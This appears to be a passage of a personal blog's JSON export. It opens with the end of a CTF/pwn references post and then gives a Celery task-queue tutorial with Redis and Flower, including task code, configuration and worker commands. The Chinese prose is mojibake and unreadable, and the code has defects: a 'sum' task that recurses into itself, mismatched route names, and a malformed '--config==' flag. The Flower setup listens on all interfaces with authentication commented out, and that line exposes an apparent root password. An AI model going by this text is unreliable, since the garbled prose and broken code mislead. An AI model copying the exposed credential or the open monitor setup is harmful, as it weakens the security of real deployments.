(å…³é—­ / éƒ¨åˆ†å¼€å¯ / å®Œå…¨å¼€å¯) ##å…«ã€å…¥é—¨çš„å‚è€ƒæ–‡ç«  ç¼“å†²åŒºæº¢å‡ºçš„åº”ç”¨å®ä¾‹CTF githubèµ„æºæ•´åˆPWNçš„å…¥é—¨æ‰‹æŠŠæ‰‹æ•™ä½ æ ˆæº¢å‡ºä»å…¥é—¨åˆ°æ”¾å¼ƒ","categories":[{"name":"linuxç¨‹åºçš„ä¿æŠ¤æœºåˆ¶","slug":"linuxç¨‹åºçš„ä¿æŠ¤æœºåˆ¶","permalink":"http://yubenliu.cn/categories/linuxç¨‹åºçš„ä¿æŠ¤æœºåˆ¶/"}],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"http://yubenliu.cn/tags/é€†å‘/"},{"name":"ctf","slug":"ctf","permalink":"http://yubenliu.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://yubenliu.cn/tags/pwn/"}]},{"title":"pythonä¸­çš„ä»»åŠ¡é˜Ÿåˆ—","slug":"python-task-ququ22e","date":"2018-01-02T06:20:00.000Z","updated":"2019-11-08T10:36:34.511Z","comments":true,"path":"2018/01/02/python-task-ququ22e/","link":"","permalink":"http://yubenliu.cn/2018/01/02/python-task-ququ22e/","excerpt":"ä¸ºä»€ä¹ˆè¦åšä»»åŠ¡é˜Ÿåˆ— è¦å›ç­”è¿™ä¸ªé—®é¢˜æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹åœ¨æµæ°´çº¿ä¸Šçš„æ¡ˆåˆ—ï¼Œå¦‚æœäººçš„é€Ÿåº¦å¾ˆæ…¢ï¼Œæœºå™¨çš„é€Ÿåº¦æ¯”äººçš„é€Ÿåº¦å¿«å¾ˆå¤šï¼Œå°±ä¼šé€ æˆï¼Œæœºå™¨ç”Ÿäº§çš„ä¸œè¥¿æ²¡æœ‰åŠæ—¶å¤„ç†ï¼Œè¶Šç§¯è¶Šå¤šï¼Œé€ æˆé˜»å¡ï¼Œå½±å“ç”Ÿäº§ã€‚","text":"ä¸ºä»€ä¹ˆè¦åšä»»åŠ¡é˜Ÿåˆ— è¦å›ç­”è¿™ä¸ªé—®é¢˜æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹åœ¨æµæ°´çº¿ä¸Šçš„æ¡ˆåˆ—ï¼Œå¦‚æœäººçš„é€Ÿåº¦å¾ˆæ…¢ï¼Œæœºå™¨çš„é€Ÿåº¦æ¯”äººçš„é€Ÿåº¦å¿«å¾ˆå¤šï¼Œå°±ä¼šé€ æˆï¼Œæœºå™¨ç”Ÿäº§çš„ä¸œè¥¿æ²¡æœ‰åŠæ—¶å¤„ç†ï¼Œè¶Šç§¯è¶Šå¤šï¼Œé€ æˆé˜»å¡ï¼Œå½±å“ç”Ÿäº§ã€‚ ä»»åŠ¡é˜Ÿåˆ—çš„æ„ä¹‰ï¼š æ‰“ä¸ªæ¯”æ–¹å¦‚æœå‡ºç°äººçš„é€Ÿåº¦è·Ÿä¸ä¸Šæœºå™¨é€Ÿåº¦æ€ä¹ˆåŠï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ç¬¬ä¸‰æ–¹ï¼Œç›‘ç®¡äººå‘˜ï¼ˆä»»åŠ¡é˜Ÿåˆ—ï¼‰æŠŠæœºå™¨ç”Ÿäº§çš„ä¸œè¥¿ï¼Œæ”¾åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œï¼ˆé˜Ÿåˆ—ï¼‰ï¼Œç„¶ååˆ†é…ç»™æ¯ä¸ªç”¨æˆ·ï¼Œæœ‰æ¡ä¸ç†çš„æ‰§è¡Œã€‚ python é‡Œé¢çš„celery æ¨¡å—æ˜¯ä¸€ä¸ªç®€å•ï¼Œçµæ´»ä¸”å¯é çš„ï¼Œå¤„ç†å¤§é‡æ¶ˆæ¯çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¹¶ä¸”æä¾›ç»´æŠ¤è¿™æ ·ä¸€ä¸ªç³»ç»Ÿçš„å¿…éœ€å·¥å…·ã€‚å®ƒæ˜¯ä¸€ä¸ªä¸“æ³¨äºå®æ—¶å¤„ç†çš„ä»»åŠ¡é˜Ÿåˆ—ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒä»»åŠ¡è°ƒåº¦ã€‚ å…³äºå®‰è£…celery pip install Celery å…³äºcelery çš„æ¦‚å¿µä»‹ç»æ¶ˆæ¯é˜Ÿåˆ—æ¶ˆæ¯é˜Ÿåˆ—çš„è¾“å…¥æ˜¯å·¥ä½œçš„ä¸€ä¸ªå•å…ƒï¼Œç§°ä¸ºä»»åŠ¡ï¼Œç‹¬ç«‹çš„èŒç¨‹ï¼ˆWorkerï¼‰è¿›ç¨‹æŒç»­ç›‘è§†é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰éœ€è¦å¤„ç†çš„æ–°ä»»åŠ¡ã€‚Celery ç”¨æ¶ˆæ¯é€šä¿¡ï¼Œé€šå¸¸ä½¿ç”¨ä¸­é—´äººï¼ˆBrokerï¼‰åœ¨å®¢æˆ·ç«¯å’ŒèŒç¨‹é—´æ–¡æ—‹ã€‚è¿™ä¸ªè¿‡ç¨‹ä»å®¢æˆ·ç«¯å‘é˜Ÿåˆ—æ·»åŠ æ¶ˆæ¯å¼€å§‹ï¼Œä¹‹åä¸­é—´äººæŠŠæ¶ˆæ¯æ´¾é€ç»™èŒç¨‹ï¼ŒèŒç¨‹å¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Celery ç³»ç»Ÿå¯åŒ…å«å¤šä¸ªèŒç¨‹å’Œä¸­é—´äººï¼Œä»¥æ­¤è·å¾—é«˜å¯ç”¨æ€§å’Œæ¨ªå‘æ‰©å±•èƒ½åŠ›ã€‚Celery**çš„æ¶æ„Celeryçš„æ¶æ„ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œæ¶ˆæ¯ä¸­é—´ä»¶ï¼ˆmessage brokerï¼‰ï¼Œä»»åŠ¡æ‰§è¡Œå•å…ƒï¼ˆworkerï¼‰å’Œä»»åŠ¡æ‰§è¡Œç»“æœå­˜å‚¨ï¼ˆtask result storeï¼‰ç»„æˆã€‚ æ¶ˆæ¯ä¸­é—´ä»¶Celeryæœ¬èº«ä¸æä¾›æ¶ˆæ¯æœåŠ¡ï¼Œä½†æ˜¯å¯ä»¥æ–¹ä¾¿çš„å’Œç¬¬ä¸‰æ–¹æä¾›çš„æ¶ˆæ¯ä¸­é—´ä»¶é›†æˆï¼ŒåŒ…æ‹¬ï¼ŒRabbitMQ,Redis,MongoDBç­‰ï¼Œè¿™é‡Œæˆ‘å…ˆå»äº†è§£RabbitMQ,Redisã€‚ ä»»åŠ¡æ‰§è¡Œå•å…ƒWorkeræ˜¯Celeryæä¾›çš„ä»»åŠ¡æ‰§è¡Œçš„å•å…ƒï¼Œworkerå¹¶å‘çš„è¿è¡Œåœ¨åˆ†å¸ƒå¼çš„ç³»ç»ŸèŠ‚ç‚¹ä¸­ ä»»åŠ¡ç»“æœå­˜å‚¨**Task result storeç”¨æ¥å­˜å‚¨Workeræ‰§è¡Œçš„ä»»åŠ¡çš„ç»“æœï¼ŒCeleryæ”¯æŒä»¥ä¸åŒæ–¹å¼å­˜å‚¨ä»»åŠ¡çš„ç»“æœï¼ŒåŒ…æ‹¬Redisï¼ŒMongoDBï¼ŒDjango ORMï¼ŒAMQPç­‰ï¼Œè¿™é‡Œæˆ‘å…ˆä¸å»çœ‹å®ƒæ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Œå°±å…ˆé€‰ç”¨Redisæ¥å­˜å‚¨ä»»åŠ¡æ‰§è¡Œç»“æœã€‚ å®æˆ˜ ç¯å¢ƒ kaillinux ä¸»æœºä¸¤å°ï¼ˆ192.168.29.234ï¼Œ192.168.29.198ï¼‰ redis (192.168.29.234 ) flower (192.168.29.234) ä»»åŠ¡è„šæœ¬ï¼ˆä¸¤å°éƒ½å¿…é¡»éƒ¨ç½²ï¼‰ ä»»åŠ¡è„šæœ¬ tasks.py (è®¡ç®—åŠ å‡ä¹˜é™¤) import os import sys import datetime BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) sys.path.append(BASE_DIR) from celery import Celery from celery import chain, group, chord, Task import celeryconfig app = Celery() app.config_from_object(celeryconfig) __all__ = [&#39;add&#39;, &#39;reduce&#39;,&#39;sum_all&#39;, &#39;other&#39;] #################################### # tas # #################################### @app.task def add(x, y): return x + y @app.task def reduce(x, y): return x - y @app.task def sum(values): return sum([int(value) for value in values]) @app.task def other(x, y): return x * y celeryconfig.py !/usr/bin/python #coding:utf-8 from kombu import Queue CELERY_TIMEZONE = &#39;Asia/Shanghai&#39; #################################### # ä¸€èˆ¬é…ç½® # #################################### CELERY_TASK_SERIALIZER = &#39;json&#39; CELERY_RESULT_SERIALIZER = &#39;json&#39; CELERY_ACCEPT_CONTENT=[&#39;json&#39;] CELERY_TIMEZONE = &#39;Asia/Shanghai&#39; CELERY_ENABLE_UTC = True # List of modules to import when celery starts. CELERY_IMPORTS = (&#39;tasks&#39;, ) CELERYD_MAX_TASKS_PER_CHILD = 40 # æ¯ä¸ªworkeræ‰§è¡Œäº†å¤šå°‘ä»»åŠ¡å°±ä¼šæ­»æ‰ BROKER_POOL_LIMIT = 10 #é»˜è®¤celeryä¸brokerè¿æ¥æ± è¿æ¥æ•° CELERY_DEFAULT_QUEUE=&#39;default&#39; CELERY_DEFAULT_ROUTING_KEY=&#39;task.default&#39; CELERY_RESULT_BACKEND=&#39;redis://192.168.29.234:6379/0&#39; BROKER_URL=&#39;redis://192.168.29.234:6379/0&#39; #é»˜è®¤é˜Ÿåˆ— CELERY_DEFAULT_QUEUE = &#39;celery&#39; CELERY_DEFAULT_ROUTING_KEY = &#39;celery&#39; CELERYD_LOG_FILE=&quot;./logs/celery.log&quot; CELERY_QUEUEs = ( Queue(&quot;queue_add&quot;, routing_key=&#39;queue_add&#39;), Queue(&#39;queue_reduce&#39;, routing_key=&#39;queue_sum&#39;), Queue(&#39;celery&#39;, routing_key=&#39;celery&#39;), ) CELERY_ROUTES = { &#39;task.add&#39;:{&#39;queue&#39;:&#39;queue_add&#39;, &#39;routing_key&#39;:&#39;queue_add&#39;}, &#39;task.reduce&#39;:{&#39;queue&#39;:&#39;queue_reduce&#39;, &#39;routing_key&#39;:&#39;queue_sum&#39;}, } å…³äºfloweræ˜¯ç›‘æ§ä»»åŠ¡ä¿¡æ¯çš„web å›¾è¡¨ï¼Œé»˜è®¤çš„é…ç½®æ²¡æœ‰åšéªŒè¯ï¼Œè€Œä¸”å½“ä¸»æœºé‡å¯æ—¶ï¼Œæ•°æ®ä¼šä¸¢å¤±ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è‡ªå®šä¹‰ä¸€ä¸ªflower æ–‡ä»¶flower github åœ¨234 ä¸Šflower.py çš„è„šæœ¬ #!/usr/bin/env python #coding:utf-8 broker_api = &#39;redis://127.0.0.1:6379/0&#39; logging = &#39;DEBUG&#39; address = &#39;0.0.0.0&#39; port = 5555 #å¤–éƒ¨è®¿é—®å¯†ç  #basic_auth=[&#39;root:ybl8651073&#39;] persistent=True #æŒä¹…åŒ–celery tasksï¼ˆå¦‚æœä¸ºfalseçš„è¯ï¼Œé‡å¯flowerä¹‹åï¼Œç›‘æ§çš„taskå°±æ¶ˆå¤±äº†) db=&quot;/root/flower_db&quot; è¿è¡Œ åœ¨198ä¸Šå¯åŠ¨celery worker -A tasks --loglevel=info --queues=celery,queue_add --hostname=celery_worker198 åœ¨234 ä¸Šå¯åŠ¨ 1. redisæœåŠ¡ 2. celery worker -A tasks --loglevel=info --queues=celery,queue_reduce --hostname=celery_worker234 3. celery flower worker -A tasks --config==/root/flower.py æœåŠ¡å™¨éªŒè¯ åœ¨ä»»ä¸€å°æœ‰celeryserviceé¡¹ç›®ä»£ç çš„æœåŠ¡å™¨ä¸Šï¼Œè¿è¡Œaddã€reduceã€- sumã€otherä»»åŠ¡ï¼ˆæµ‹è¯•å¯ç®€å•ä½¿ç”¨add.delay(1,2)ç­‰ï¼‰ addåªä¼šåœ¨198ä¸Šè¿è¡Œï¼Œ sumä»»åŠ¡ï¼Œå¯èƒ½ä¼šåœ¨198æˆ–234æœåŠ¡å™¨çš„workerèŠ‚ç‚¹è¿è¡Œ reduceä»»åŠ¡,åªä¼šåœ¨234ä¸Šè¿è¡Œã€‚ otherä»»åŠ¡å¯èƒ½ä¼šåœ¨198æˆ–è€…234ä¸Šè¿è¡Œã€‚ æ‰“å¼€ç›‘æ§web 192.168.29.234:5555 éšæœºè¿è¡Œå‡ ä¸ªä»»åŠ¡ åˆ†æ ä¹Ÿå¯ä»¥é€šè¿‡ curlæäº¤ä»»åŠ¡curl -X POST -d &#39;{&quot;args&quot;:[1,2]}&#39; http://192.168.29.234:5555/api/task/async-apply/tasks.add","categories":[{"name":"djangoä»»åŠ¡é˜Ÿåˆ—","slug":"djangoä»»åŠ¡é˜Ÿåˆ—","permalink":"http://yubenliu.cn/categories/djangoä»»åŠ¡é˜Ÿåˆ—/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yubenliu.cn/tags/Python/"},{"name":"Linux","slug":"Linux","permalink":"http://yubenliu.cn/tags/Linux/"},{"name":"django","slug":"django","permalink":"http://yubenliu.cn/tags/django/"}]}]}